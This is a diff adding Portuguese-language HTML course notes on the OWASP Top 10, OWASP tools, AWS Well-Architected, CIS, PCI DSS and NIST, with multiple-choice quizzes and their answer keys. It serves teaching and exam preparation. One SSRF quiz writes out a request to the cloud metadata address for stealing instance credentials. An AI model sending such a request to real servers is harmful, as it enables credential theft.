+          <li class="opt" data-key="A"><span class="marker">A</span><span>A01 — Broken Access Control.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>A03 — Injection.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>A07 — Identification and Authentication Failures.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>A02 — Cryptographic Failures.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O usuário está <strong>autenticado corretamente</strong>; o que falta é o servidor checar se a fatura pertence a ele — falha de <strong>autorização</strong>, ou seja, <strong>A01</strong> (o caso clássico chamado IDOR, Insecure Direct Object Reference). Não há código injetado (A03), a identidade dele está certa (A07) e nada depende de criptografia (A02).</div>
+      </div>
+
+      <div class="quiz reveal" data-answer="D">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Uma funcionalidade "gerar prévia de link" faz o servidor baixar qualquer URL enviada pelo usuário. Um atacante envia <code>http://169.254.169.254/latest/meta-data/</code> e obtém credenciais da instância EC2. Qual categoria do Top 10 2021?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>A05 — Security Misconfiguration.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>A03 — Injection, na forma de XSS.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>A08 — Software and Data Integrity Failures.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>A10 — Server-Side Request Forgery (SSRF).</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O atacante faz o <strong>servidor</strong> enviar uma requisição a um destino interno que ele não alcançaria de fora: <strong>SSRF</strong>, A10 (o endereço 169.254.169.254 é o serviço de metadados das instâncias na nuvem). Não há script no navegador (XSS); a configuração pode agravar, mas a falha é aceitar URL arbitrária; integridade (A08) trata de código/atualização não verificada.</div>
+      </div>
+
+      <h3 id="top10-mudancas">O que mudou de 2017 para 2021</h3>
+      <p>A aula destaca as mudanças entre as duas edições. Em resumo: <strong>3 categorias novas</strong>, <strong>3 fusões</strong>, <strong>renomeações</strong> que trocam o <em>sintoma</em> pela <em>causa raiz</em>, e a subida do controle de acesso para o 1º lugar. Das 10 categorias de 2021, <strong>8 vieram dos dados</strong> de testes e <strong>2 da pesquisa com a comunidade</strong> (A09 e A10) — riscos que os dados ainda não capturam bem.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>2017</th><th>→</th><th>2021</th><th>O que aconteceu</th></tr></thead>
+          <tbody>
+            <tr><td>A1 Injection</td><td>↓</td><td><strong>A03</strong> Injection</td><td>Caiu do 1º para o 3º e <strong>absorveu o XSS</strong>.</td></tr>
+            <tr><td>A2 Broken Authentication</td><td>↓</td><td><strong>A07</strong> Identification and Authentication Failures</td><td>Caiu e foi renomeada (mais frameworks padronizados de autenticação).</td></tr>
+            <tr><td>A3 Sensitive Data Exposure</td><td>↑</td><td><strong>A02</strong> Cryptographic Failures</td><td><strong>Renomeada</strong>: "exposição de dados" era o sintoma; a causa raiz é a falha criptográfica.</td></tr>
+            <tr><td>A4 XML External Entities (XXE)</td><td>⇢</td><td>dentro de <strong>A05</strong></td><td><strong>Fundida</strong> em Security Misconfiguration.</td></tr>
+            <tr><td>A5 Broken Access Control</td><td>↑</td><td><strong>A01</strong> Broken Access Control</td><td><strong>Subiu para o 1º lugar</strong> (94% das aplicações testadas tinham alguma falha desse tipo).</td></tr>
+            <tr><td>A6 Security Misconfiguration</td><td>↑</td><td><strong>A05</strong> Security Misconfiguration</td><td>Subiu e incorporou o XXE.</td></tr>
+            <tr><td>A7 Cross-Site Scripting (XSS)</td><td>⇢</td><td>dentro de <strong>A03</strong></td><td><strong>Fundida</strong> em Injection.</td></tr>
+            <tr><td>A8 Insecure Deserialization</td><td>⇢</td><td>dentro de <strong>A08</strong></td><td><strong>Fundida</strong> na nova Software and Data Integrity Failures.</td></tr>
+            <tr><td>A9 Using Components with Known Vulnerabilities</td><td>↑</td><td><strong>A06</strong> Vulnerable and Outdated Components</td><td>Subiu e ampliou o escopo para componentes <em>desatualizados</em>.</td></tr>
+            <tr><td>A10 Insufficient Logging &amp; Monitoring</td><td>↑</td><td><strong>A09</strong> Security Logging and Monitoring Failures</td><td>Subiu (pela pesquisa da comunidade) e foi renomeada.</td></tr>
+            <tr><td>—</td><td>✦</td><td><strong>A04</strong> Insecure Design</td><td><span class="pill strat">Nova</span> falhas de concepção, não de implementação.</td></tr>
+            <tr><td>—</td><td>✦</td><td><strong>A08</strong> Software and Data Integrity Failures</td><td><span class="pill strat">Nova</span> atualizações, dados críticos e pipelines CI/CD sem verificação de integridade.</td></tr>
+            <tr><td>—</td><td>✦</td><td><strong>A10</strong> SSRF</td><td><span class="pill strat">Nova</span> veio da pesquisa com a comunidade (1º lugar nela).</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha — as três que "sumiram"</span>
+        <p>XSS, XXE e Insecure Deserialization <strong>não deixaram de ser riscos</strong> em 2021 — foram <strong>fundidos</strong>: <strong>XSS → A03 Injection</strong>, <strong>XXE → A05 Security Misconfiguration</strong>, <strong>Insecure Deserialization → A08 Software and Data Integrity Failures</strong>. Alternativa dizendo "o XSS foi removido do Top 10 2021 por ter sido resolvido" está errada.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="B">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Comparando o OWASP Top 10 de 2017 com o de 2021, assinale a afirmação <strong>correta</strong>.</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Injection permaneceu em 1º lugar, e XSS ganhou uma categoria própria.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Broken Access Control subiu para o 1º lugar, e XSS passou a fazer parte de Injection.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Sensitive Data Exposure foi mantida com o mesmo nome em 2º lugar.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Insecure Design já existia em 2017 e só mudou de posição.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> Em 2021, <strong>A01 Broken Access Control</strong> (era A5) assumiu o topo e o <strong>XSS foi incorporado a A03 Injection</strong>. Injection caiu para 3º; Sensitive Data Exposure foi <em>renomeada</em> para Cryptographic Failures (A02); Insecure Design é uma das <em>três categorias novas</em> de 2021.</div>
+      </div>
+
+      <h3 id="top10-top4">As 4 primeiras categorias em detalhe</h3>
+      <p>A videoaula aprofunda as quatro vulnerabilidades no topo da lista de 2021. São as que mais aparecem em cenários de prova.</p>
+
+      <div class="card reveal">
+        <h4>A01 · Broken Access Control — "você é quem diz, mas pode fazer isso?"</h4>
+        <p>Controle de acesso é a regra que decide <strong>o que</strong> um usuário autenticado pode fazer. A falha acontece quando essa regra não existe, só existe no front-end ou pode ser contornada.</p>
+        <ul>
+          <li><strong>Formas comuns:</strong> IDOR (trocar o ID na URL), escalada de privilégio (usuário vira admin alterando um campo <code>role</code> enviado no JSON), acesso direto a rotas de admin não linkadas (<em>forced browsing</em>), CORS liberado para qualquer origem, JWT manipulado.</li>
+          <li><strong>Prevenção:</strong> <strong>negar por padrão</strong>; checar no <em>servidor</em>, a cada requisição, a permissão <strong>e a propriedade</strong> do recurso; aplicar menor privilégio; registrar e alertar falhas de acesso; invalidar sessões no logout.</li>
+        </ul>
+      </div>
+
+      <div class="card reveal">
+        <h4>A02 · Cryptographic Failures — dado sensível mal protegido</h4>
+        <p>Antes chamada <em>Sensitive Data Exposure</em>. Agrupa ausência de criptografia e uso de criptografia errada.</p>
+        <ul>
+          <li><strong>Formas comuns:</strong> tráfego em HTTP; senhas em texto puro ou com hash rápido (MD5, SHA-1) e sem <em>salt</em>; algoritmos obsoletos (DES, RC4); chaves fixas no código ou no repositório; certificado não validado.</li>
+          <li><strong>Prevenção:</strong> classificar os dados e não guardar o que não é necessário; TLS em tudo (com HSTS); criptografar em repouso (AES-GCM); senhas com função de hash <em>lenta</em> e com salt (bcrypt, scrypt, Argon2); chaves num gerenciador (AWS KMS, Secrets Manager).</li>
+        </ul>
+      </div>
+
+      <div class="card reveal">
+        <h4>A03 · Injection — dado do usuário interpretado como comando</h4>
+        <p>Inclui SQL, NoSQL, comando de SO, LDAP, ORM e, desde 2021, <strong>XSS</strong>.</p>
+        <ul>
+          <li><strong>Raiz:</strong> input não validado nem separado do comando.</li>
+          <li><strong>Prevenção:</strong> API segura/queries parametrizadas; validação no servidor por allowlist; escape específico do interpretador quando não houver alternativa; <code>LIMIT</code> nas queries para reduzir o vazamento em massa; SAST e DAST no pipeline.</li>
+        </ul>
+      </div>
+
+      <div class="card reveal">
+        <h4>A04 · Insecure Design — a falha está no desenho, não no código</h4>
+        <p>Categoria <strong>nova em 2021</strong>. Um design inseguro <strong>não se corrige com uma implementação perfeita</strong>: o controle de segurança necessário simplesmente nunca foi pensado.</p>
+        <ul>
+          <li><strong>Exemplos:</strong> recuperar senha com "pergunta secreta" (respostas descobríveis em redes sociais); site de ingressos sem limite de compra por usuário, permitindo que um bot compre tudo; fluxo de pagamento que confia no preço enviado pelo cliente.</li>
+          <li><strong>Prevenção:</strong> <strong>modelagem de ameaças</strong> (ex.: STRIDE) nas funcionalidades críticas; casos de abuso escritos junto com as histórias de usuário; bibliotecas de padrões de design seguro; ciclo de desenvolvimento seguro — é o Security by Design da Aula 1.</li>
+        </ul>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha — Insecure Design × Security Misconfiguration</span>
+        <p><strong>A04 Insecure Design</strong>: o controle <em>não foi projetado</em> (não existe limite de tentativas no fluxo, a regra de negócio é explorável). <strong>A05 Security Misconfiguration</strong>: o controle existe, mas está <em>mal configurado</em> (senha padrão ativa, debug ligado em produção, bucket público). Pergunta-chave: "corrigir a configuração resolve?" Se sim, é A05; se é preciso redesenhar o fluxo, é A04.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="C">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Um sistema permite recuperar a senha respondendo "qual o nome do seu primeiro animal de estimação?". A implementação está livre de bugs, mas atacantes descobrem as respostas pelas redes sociais das vítimas. Qual categoria do Top 10 2021 melhor descreve o problema?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>A05 — Security Misconfiguration.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>A03 — Injection.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>A04 — Insecure Design.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>A06 — Vulnerable and Outdated Components.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O código funciona como projetado — o problema é o <strong>próprio desenho</strong> do fluxo de recuperação, que nenhuma implementação corrige: <strong>A04 Insecure Design</strong> (o OWASP usa exatamente esse exemplo). Não é configuração (A05), não há input interpretado como comando (A03), nem biblioteca desatualizada (A06).</div>
+      </div>
+
+      <div class="callout reveal">
+        <span class="tag">ℹ Além do material — edição 2025</span>
+        <p>A OWASP publicou em novembro de 2025 uma nova edição do Top 10. Entre as mudanças: Security Misconfiguration sobe para A02, nasce <strong>A03 Software Supply Chain Failures</strong> (ampliando os componentes vulneráveis), o SSRF é incorporado a Broken Access Control e surge <strong>A10 Mishandling of Exceptional Conditions</strong>. <strong>A disciplina e a prova usam a edição 2021</strong> — use a tabela de 2021 para responder.</p>
+      </div>
+
+      <h3 id="owasp-projetos">Outros projetos OWASP</h3>
+
+      <div class="card reveal">
+        <h4>OWASP Dependency-Track — gestão de risco das dependências (SCA)</h4>
+        <p>Plataforma que mantém uma visão de <strong>todas as dependências</strong> de cada projeto (o "portfólio") e cruza com fontes de vulnerabilidades conhecidas — <strong>NIST NVD</strong> (National Vulnerability Database), <strong>VulnDB</strong> e outras fontes públicas — para classificar cada dependência por <strong>nível de risco</strong> e priorizar as mais críticas. Recebe a lista de componentes no formato de SBOM (CycloneDX). Para tirar mais proveito, a aula recomenda:</p>
+        <ul>
+          <li><strong>Integrar ao pipeline de CI:</strong> avaliar as dependências automaticamente a cada build.</li>
+          <li><strong>Monitorar o portfólio regularmente:</strong> uma biblioteca segura hoje pode ganhar uma CVE amanhã.</li>
+          <li><strong>Política de aceitação de dependências:</strong> definir quais são permitidas e quais são proibidas.</li>
+          <li><strong>Treinar e sensibilizar a equipe</strong> sobre a gestão segura de dependências.</li>
+        </ul>
+      </div>
+
+      <p>O <strong>Juice Shop</strong> e o <strong>WebGoat</strong> são aplicações <strong>deliberadamente inseguras</strong> para praticar a exploração e a correção de vulnerabilidades sem risco para sistemas reais. Benefícios citados: aprendizado prático em ambiente seguro, sensibilização para segurança e aprimoramento de habilidades. A aula compara os dois em quatro critérios:</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Critério</th><th>WebGoat</th><th>Juice Shop</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Enfoque</strong></td><td><strong>Lições</strong>, cada uma com um desafio sobre uma vulnerabilidade (SQLi, XSS, autenticação, controle de acesso…).</td><td>Um <strong>e-commerce</strong> inseguro com desafios contínuos, sem lições separadas.</td></tr>
+            <tr><td><strong>Ambiente</strong></td><td>Instruções específicas para cada vulnerabilidade, abordada <strong>individualmente</strong>.</td><td>Experiência <strong>contínua e dinâmica</strong>: explorar a aplicação inteira, achar e corrigir falhas.</td></tr>
+            <tr><td><strong>Realismo</strong></td><td>Mais "plataforma de treinamento"; conceitos ensinados de forma <strong>isolada</strong>.</td><td>Simula uma aplicação <strong>real</strong>.</td></tr>
+            <tr><td><strong>Tecnologia</strong></td><td>Várias versões (o material cita Java, .NET, Node.js) — o projeto principal é Java.</td><td><strong>Somente JavaScript/Node.js.</strong></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>O nome <em>WebGoat</em> combina "Web" e "Goat" (bode): o bode é o alvo onde se pratica. A recomendação da aula é usar os dois.</p>
+
+      <div class="quiz reveal" data-answer="A">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Um time quer treinar desenvolvedores com <strong>lições guiadas</strong>, cada uma focada em uma vulnerabilidade específica, com instruções passo a passo. Qual projeto OWASP se encaixa melhor?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>OWASP WebGoat.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>OWASP Juice Shop.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>OWASP Dependency-Track.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>OWASP Top 10.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O <strong>WebGoat</strong> é organizado em <strong>lições</strong> por vulnerabilidade. O <em>Juice Shop</em> é um e-commerce realista com desafios contínuos, sem lições isoladas; o <em>Dependency-Track</em> gerencia risco de dependências; o <em>Top 10</em> é um documento, não um ambiente de treino.</div>
+      </div>
+
+      <div class="card reveal">
+        <h4>OWASP Web Security Testing Guide (WSTG)</h4>
+        <p>Guia abrangente e prático de <strong>como testar</strong> a segurança de aplicações web — do básico às técnicas avançadas —, revisado periodicamente pela comunidade. Seções citadas na aula:</p>
+        <ul>
+          <li><strong>Information Gathering:</strong> descobrir tecnologias usadas, estrutura de diretórios e detalhes úteis ao atacante.</li>
+          <li><strong>Configuration and Deployment Management Testing:</strong> fraquezas na configuração e na implantação.</li>
+          <li><strong>Identity Management Testing:</strong> mecanismos de gestão de identidade (criação de contas, papéis).</li>
+          <li><strong>Authentication Testing:</strong> força bruta, política de senha, MFA.</li>
+          <li><strong>Session Management Testing:</strong> sessões que não expiram, roubadas ou não autenticadas.</li>
+          <li><strong>Input Validation Testing:</strong> SQL Injection, XSS e outros ataques por input malicioso.</li>
+          <li><strong>Error Handling Testing:</strong> erros e exceções que expõem informação sensível.</li>
+        </ul>
+      </div>
+
+      <div class="card reveal">
+        <h4>OWASP ZAP (Zed Attack Proxy) — o hands-on da aula</h4>
+        <p>Ferramenta gratuita de <strong>DAST</strong>. Funciona como um <strong>proxy</strong> entre o navegador e a aplicação, vendo e alterando as requisições. Recursos principais: <em>spider</em> (mapeia as páginas), <strong>scan passivo</strong> (só observa o tráfego e aponta problemas, como cabeçalhos de segurança ausentes) e <strong>scan ativo</strong> (envia ataques reais — SQLi, XSS — e por isso só deve ser usado em ambiente autorizado). Pode rodar no pipeline de CI contra o ambiente de homologação. Desde 2023 o ZAP é mantido fora da OWASP, mas continua conhecido como "OWASP ZAP".</p>
+      </div>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Documento OWASP</th><th>Responde à pergunta</th><th>Natureza</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Top 10</strong></td><td>"Quais são os riscos mais críticos?"</td><td>Conscientização — não é norma nem checklist completo.</td></tr>
+            <tr><td><strong>WSTG</strong></td><td>"Como eu <em>testo</em> se a aplicação é segura?"</td><td>Metodologia de teste (pentest).</td></tr>
+            <tr><td>ASVS</td><td>"Que <em>requisitos</em> de segurança a aplicação deve cumprir?"</td><td>Padrão verificável em níveis (L1–L3).</td></tr>
+            <tr><td>Cheat Sheet Series</td><td>"Como implemento a defesa X?"</td><td>Guias curtos por tema.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha</span>
+        <p>O <strong>OWASP Top 10 não é uma norma de conformidade</strong> nem uma lista exaustiva. Ele é um documento de <strong>conscientização</strong> sobre os riscos mais comuns. Uma aplicação "sem nenhum item do Top 10" não está automaticamente segura, e não existe "certificação OWASP Top 10".</p>
+      </div>
+
+      <!-- ============================================================ AULA 6 ============================================================ -->
+      <h2 id="well-architected"><span class="h2-kicker">Aula 6 · Padrões de segurança</span>AWS Well-Architected Framework</h2>
+      <p>O <span class="lead-term">Well-Architected Framework</span> é o conjunto de boas práticas da AWS para avaliar e melhorar arquiteturas na nuvem — um padrão que, na prática, as outras nuvens também seguem (Azure e Google Cloud têm frameworks equivalentes). Ele se organiza em <strong>6 pilares</strong>, e a disciplina dá destaque ao de <strong>Segurança</strong>.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Pilar (nome oficial)</th><th>Pergunta que responde</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Excelência Operacional</strong> (Operational Excellence)</td><td>Como operar, monitorar e melhorar continuamente o sistema? (automação, IaC, mudanças pequenas e reversíveis)</td></tr>
+            <tr><td><strong>Segurança</strong> (Security)</td><td>Como proteger dados, sistemas e ativos?</td></tr>
+            <tr><td><strong>Confiabilidade</strong> (Reliability)</td><td>O sistema se recupera de falhas e cumpre o que promete?</td></tr>
+            <tr><td><strong>Eficiência de Performance</strong> (Performance Efficiency)</td><td>Uso eficiente dos recursos conforme a demanda muda?</td></tr>
+            <tr><td><strong>Otimização de Custos</strong> (Cost Optimization)</td><td>Entregar valor pelo menor custo?</td></tr>
+            <tr><td><strong>Sustentabilidade</strong> (Sustainability)</td><td>Minimizar o impacto ambiental? (o 6º pilar, adicionado em 2021)</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="mnemonic">
+        <div class="m-head">Mnemônico — os 6 pilares</div>
+        <div class="m-word">"<b>E</b>u <b>S</b>empre <b>C</b>onfio <b>E</b>m <b>O</b>bras <b>S</b>ustentáveis"</div>
+        <ul>
+          <li><b>E</b> → <strong>E</strong>xcelência Operacional</li>
+          <li><b>S</b> → <strong>S</strong>egurança</li>
+          <li><b>C</b> → <strong>C</strong>onfiabilidade</li>
+          <li><b>E</b> → <strong>E</strong>ficiência de Performance</li>
+          <li><b>O</b> → <strong>O</strong>timização de Custos</li>
+          <li><b>S</b> → <strong>S</strong>ustentabilidade</li>
+        </ul>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha — nomes dos pilares</span>
+        <p>O material usa traduções livres ("Performance Operacional", "Resiliência"). Os nomes oficiais em português são <strong>Excelência Operacional</strong> e <strong>Confiabilidade</strong>. Itens como <em>Escalabilidade</em>, <em>Disponibilidade</em> ou <em>Usabilidade</em> <strong>não são pilares</strong> — são distratores comuns.</p>
+      </div>
+
+      <div class="card reveal">
+        <h4>Pilar de Segurança — princípios de design</h4>
+        <ul>
+          <li><strong>Base sólida de identidade:</strong> menor privilégio, separação de funções, sem credenciais de longa duração.</li>
+          <li><strong>Rastreabilidade:</strong> logs e métricas de todas as ações, com alertas automáticos.</li>
+          <li><strong>Segurança em todas as camadas:</strong> rede, instância, aplicação, dados (defesa em profundidade).</li>
+          <li><strong>Automatizar as boas práticas</strong> de segurança (controles como código).</li>
+          <li><strong>Proteger dados em trânsito e em repouso.</strong></li>
+          <li><strong>Manter pessoas longe dos dados:</strong> reduzir acesso manual direto.</li>
+          <li><strong>Preparar-se para eventos de segurança:</strong> plano de resposta a incidentes e simulações.</li>
+        </ul>
+        <p>Base de tudo: o <strong>Modelo de Responsabilidade Compartilhada</strong> — a AWS cuida da segurança <em>da</em> nuvem (data centers, hardware, hipervisor); o cliente cuida da segurança <em>na</em> nuvem (dados, IAM, configuração, criptografia, aplicação).</p>
+      </div>
+
+      <h3 id="aws-ferramentas">Well-Architected Tool × Trusted Advisor × Security Hub</h3>
+      <p>As três ferramentas AWS do hands-on avaliam a sua nuvem e dão recomendações, mas de jeitos diferentes. O critério de distinção é <strong>como</strong> cada uma chega às recomendações.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Ferramenta</th><th>Como funciona</th><th>Escopo</th><th>Resultado</th></tr></thead>
+          <tbody>
+            <tr><td><strong>AWS Well-Architected Tool</strong></td><td><strong>Questionário</strong> respondido pela equipe sobre um workload.</td><td>Os 6 pilares do framework.</td><td>Riscos altos/médios e um plano de melhoria.</td></tr>
+            <tr><td><strong>AWS Trusted Advisor</strong></td><td><strong>Verificações automáticas</strong> sobre a conta.</td><td>Otimização de custos, performance, segurança, tolerância a falhas, limites de serviço e excelência operacional.</td><td>Recomendações por categoria (o conjunto completo exige plano de suporte Business ou superior).</td></tr>
+            <tr><td><strong>AWS Security Hub</strong></td><td><strong>Avalia continuamente</strong> a conta contra <strong>padrões de segurança</strong> e <strong>agrega achados</strong> de outros serviços (GuardDuty, Inspector, Macie…).</td><td>Só segurança e conformidade.</td><td>Pontuação de conformidade por padrão e lista centralizada de achados.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout reveal">
+        <span class="tag">ℹ Os 4 padrões verificados pelo Security Hub (segundo a aula)</span>
+        <p><strong>AWS Foundational Security Best Practices</strong> (melhores práticas básicas da AWS) · <strong>CIS AWS Foundations Benchmark</strong> · <strong>PCI DSS</strong> · <strong>NIST SP 800-53</strong>. A aula também apresenta <strong>ISO 27001/27002</strong>, que não são padrões da AWS nem do Security Hub, mas valem como base para qualquer organização.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="C">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Qual serviço AWS verifica continuamente a conta contra padrões como CIS AWS Foundations Benchmark, PCI DSS e NIST 800-53 e centraliza os achados de outros serviços de segurança?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>AWS Well-Architected Tool.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>AWS Trusted Advisor.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>AWS Security Hub.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>AWS Cost Explorer.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O <strong>Security Hub</strong> é o painel de postura de segurança: compara a conta com padrões de conformidade e agrega achados. A <em>WA Tool</em> é um questionário sobre os 6 pilares; o <em>Trusted Advisor</em> faz verificações automáticas amplas (custo, performance, limites…), não por padrão de conformidade; o <em>Cost Explorer</em> analisa gastos.</div>
+      </div>
+
+      <h3 id="cis">CIS AWS Foundations Benchmark</h3>
+      <p>Framework do <strong>Center for Internet Security (CIS)</strong> com configurações seguras e boas práticas para fortalecer uma conta AWS. O material cita a versão <strong>1.4.0</strong> e <strong>2 níveis de conformidade</strong>: o <strong>Nível 1</strong> é a base prática, de baixo impacto na operação; o <strong>Nível 2</strong> adiciona controles mais restritivos (defesa em profundidade) para ambientes que exigem mais segurança. É atualizado regularmente para novas ameaças.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Área</th><th>Foco</th></tr></thead>
+          <tbody>
+            <tr><td>1. Identidade e acesso</td><td>Autenticação, autorização, grupos e políticas (IAM, MFA na conta root).</td></tr>
+            <tr><td>2. Monitoramento e registro</td><td>Logs e monitoramento para detectar e responder a eventos (CloudTrail, CloudWatch).</td></tr>
+            <tr><td>3. Armazenamento seguro</td><td>S3 com controle de acesso e criptografia.</td></tr>
+            <tr><td>4. Rede segura</td><td>Firewall/NAT, security groups, VPC, tráfego de rede.</td></tr>
+            <tr><td>5. Máquinas virtuais (EC2)</td><td>Inicialização segura e gestão de imagens.</td></tr>
+            <tr><td>6. Gerenciamento de configuração</td><td>Uso do AWS Config para avaliar conformidade.</td></tr>
+            <tr><td>7. Segurança da informação</td><td>Classificação e proteção dos dados.</td></tr>
+            <tr><td>8. Conformidade e integridade</td><td>Verificações e auditorias regulares.</td></tr>
+            <tr><td>9. Nível de aplicação</td><td>Configuração segura de Lambda e bancos de dados.</td></tr>
+            <tr><td>10. Emergências</td><td>Planos de resposta a incidentes e continuidade de negócios.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 id="pci-dss">PCI DSS</h3>
+      <p>O <span class="lead-term">PCI DSS</span> (Payment Card Industry Data Security Standard — Padrão de Segurança de Dados da Indústria de Cartões de Pagamento) nasceu quando as principais bandeiras se uniram no <strong>PCI SSC</strong> para definir requisitos que protegem os dados dos portadores de cartão. Vale para <strong>toda organização que armazena, processa ou transmite dados de cartão</strong>. O padrão oficial tem <strong>6 objetivos e 12 requisitos</strong>; os pontos destacados na aula se encaixam neles assim:</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Objetivo</th><th>Requisitos</th><th>Pontos da aula</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Construir e manter rede e sistemas seguros</strong></td><td>1. Controles de segurança de rede (firewall) · 2. Configurações seguras</td><td>Implementar firewalls; <strong>evitar senhas padrão</strong> de fábrica.</td></tr>
+            <tr><td><strong>Proteger os dados da conta</strong></td><td>3. Proteger dados armazenados · 4. Criptografia forte na transmissão</td><td>Criptografar dados sensíveis; <strong>mascarar/truncar</strong> o número do cartão (exibir só parte, ex.: os 4 últimos dígitos).</td></tr>
+            <tr><td><strong>Programa de gestão de vulnerabilidades</strong></td><td>5. Proteção contra malware · 6. Sistemas e software seguros</td><td>Antivírus atualizado; proteger as aplicações contra vulnerabilidades comuns (o Top 10).</td></tr>
+            <tr><td><strong>Controle de acesso forte</strong></td><td>7. Acesso pela necessidade de conhecer · 8. Identificar e autenticar usuários · 9. Restringir acesso físico</td><td><strong>Acesso mínimo necessário</strong>; <strong>identificação única</strong> para cada pessoa com acesso.</td></tr>
+            <tr><td><strong>Monitorar e testar as redes</strong></td><td>10. Registrar e monitorar todo acesso · 11. Testar a segurança regularmente</td><td>Monitorar acessos, rastrear eventos, testar sistemas e processos.</td></tr>
+            <tr><td><strong>Política de segurança da informação</strong></td><td>12. Apoiar a segurança com políticas organizacionais</td><td>Políticas para funcionários e contratados.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha</span>
+        <p>O PCI DSS é <strong>obrigatório</strong> para quem lida com dados de cartão — mas por exigência <strong>contratual das bandeiras</strong> (via adquirentes e bancos), <strong>não é uma lei</strong> como a LGPD. E ele não trata de PIX nem de dados pessoais em geral: o escopo é o <strong>dado de cartão</strong>. Truncar/mascarar o número na tela é exigência típica.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="B">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Um e-commerce exibe na tela "Cartão final 4821" em vez do número completo, e cada atendente tem login próprio, sem contas compartilhadas. Essas práticas atendem a qual padrão, e a quais pontos dele?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>ISO 27002 — gestão de ativos e segurança física.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>PCI DSS — mascarar/truncar os dados do titular e atribuir identificação única a cada pessoa com acesso.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>NIST CSF — funções Detectar e Responder.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>CIS AWS Foundations — nível 2 de armazenamento seguro.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> <strong>Truncar o número do cartão</strong> e <strong>identificação única por pessoa</strong> são requisitos literais do <strong>PCI DSS</strong>. A <em>ISO 27002</em> é genérica e não trata de cartão; <em>Detectar/Responder</em> são sobre incidentes; o <em>CIS</em> configura a conta AWS, não a exibição de dados de cartão.</div>
+      </div>
+
+      <h3 id="nist">NIST — 800-53 e as 5 funções</h3>
+      <p>O <strong>NIST</strong> (National Institute of Standards and Technology — Instituto Nacional de Padrões e Tecnologia dos EUA) promove inovação por meio de ciência, padrões e tecnologia de medição. Em <strong>fevereiro de 2013</strong>, começou a trabalhar com o setor privado para reunir as melhores práticas da indústria numa estrutura de segurança cibernética, amplamente adotada desde então. A aula apresenta cinco <strong>funções essenciais</strong>, cada uma com categorias e planos de ação:</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Função</th><th>Momento</th><th>Objetivo</th><th>Categorias (exemplos)</th></tr></thead>
+          <tbody>
